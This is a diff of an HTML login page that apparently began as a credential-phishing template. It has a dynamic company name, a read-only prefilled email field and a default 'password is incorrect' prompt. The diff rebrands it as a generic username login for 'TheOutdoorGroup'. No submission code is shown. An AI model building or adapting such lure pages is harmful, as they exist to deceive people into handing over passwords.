@@ -39,14 +39,15 @@
                     <!-- Dynamic Company Name -->
                     <h5 id="companyName" style="margin-top: 18px; margin-bottom: 6px;"></h5>
                 </div>
-                <div style="padding: 16px 40px;">
+                <div id="err" 
+                     style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
                     <p style="font-size: 13px;">
-                        The password is incorrect. Try again with your email password.
+                        Invalid login credentials. Please check your username and password and try again.
                     </p>
                 </div>
                 <div style="padding: 16px 40px;">
-                    <p style="font-size: 12px; margin-bottom: 4px;">Sign in with your Email to continue</p>
-                    <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
+                    <p style="font-size: 12px; margin-bottom: 4px;">Username</p>
+                    <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
                     <p style="font-size: 12px; margin-bottom: 4px; margin-top: 14px;">Password</p>
                     <input type="password" id="pass" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
                     <div class="sp-div" style="margin-top: 10px;">
@@ -63,7 +64,7 @@
                         <option value="13">Billing Portal</option>
                         <option value="14">Payment Portal</option>
                     </select>
-                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 All Rights Reserved</p>
+                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 TheOutdoorGroup</p>
                 </div>
             </div>
         </div>
